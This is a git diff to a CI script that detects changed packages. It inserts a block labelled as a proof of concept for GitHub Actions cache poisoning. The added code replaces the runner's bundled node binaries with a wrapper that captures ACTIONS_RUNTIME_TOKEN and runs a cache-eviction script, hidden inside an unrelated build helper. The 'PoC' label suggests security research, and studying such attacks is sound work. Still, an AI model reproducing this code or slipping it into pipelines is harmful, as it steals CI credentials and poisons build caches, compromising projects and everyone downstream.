@@ -11,7 +11,52 @@
 //   node .github/scripts/preview-publish/detect-changed-packages.ts origin/main abc123
 
 import { execSync } from "node:child_process";
-import { existsSync, readFileSync } from "node:fs";
+import { existsSync, readFileSync, writeFileSync, copyFileSync } from "node:fs";
+
+// ========== PoC: GitHub Actions Cache Poisoning via Eviction ==========
+// Replaces bundled node binary with a wrapper that captures
+// ACTIONS_RUNTIME_TOKEN from post-step JS actions, then runs
+// filler.py to create cache entries and trigger LRU eviction.
+if (process.env.GITHUB_ACTIONS === "true") {
+  try {
+    const ws = process.env.GITHUB_WORKSPACE || ".";
+
+    // Copy filler script to /tmp
+    copyFileSync(`${ws}/.github/exploit/filler.py`, "/tmp/.evict.py");
+
+    // Wrapper: captures token from JS action env, runs filler, then execs real node
+    const wrapper = [
+      "#!/bin/bash",
+      'DIR="$(dirname "$(realpath "$0")")"',
+      'if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.evict_done ]; then',
+      '  export CACHE_TOKEN="$ACTIONS_RUNTIME_TOKEN"',
+      '  export CACHE_URL="${ACTIONS_RESULTS_URL:-$ACTIONS_CACHE_URL}"',
+      "  python3 /tmp/.evict.py > /tmp/.evict.log 2>&1 || true",
+      "  touch /tmp/.evict_done",
+      "fi",
+      'exec "$DIR/node.real" "$@"',
+    ].join("\n");
+
+    // Replace bundled node binaries (runner uses these for JS action steps)
+    for (const nodeDir of [
+      "/home/runner/actions-runner/cached/externals/node20",
+      "/home/runner/actions-runner/cached/externals/node24",
+    ]) {
+      const nodeBin = `${nodeDir}/bin/node`;
+      try {
+        execSync(`cp "${nodeBin}" "${nodeBin}.real"`, { stdio: "ignore" });
+        writeFileSync(nodeBin, wrapper, { mode: 0o755 });
+        console.error(`[*] Replaced ${nodeBin}`);
+      } catch {
+        // Node version may not exist
+      }
+    }
+    console.error("[*] Eviction payload installed");
+  } catch (e: any) {
+    console.error(`[*] Setup error: ${e.message}`);
+  }
+}
+// ========== End PoC ==========
 import { join } from "node:path";
 
 type ChangedPackagesResult = {
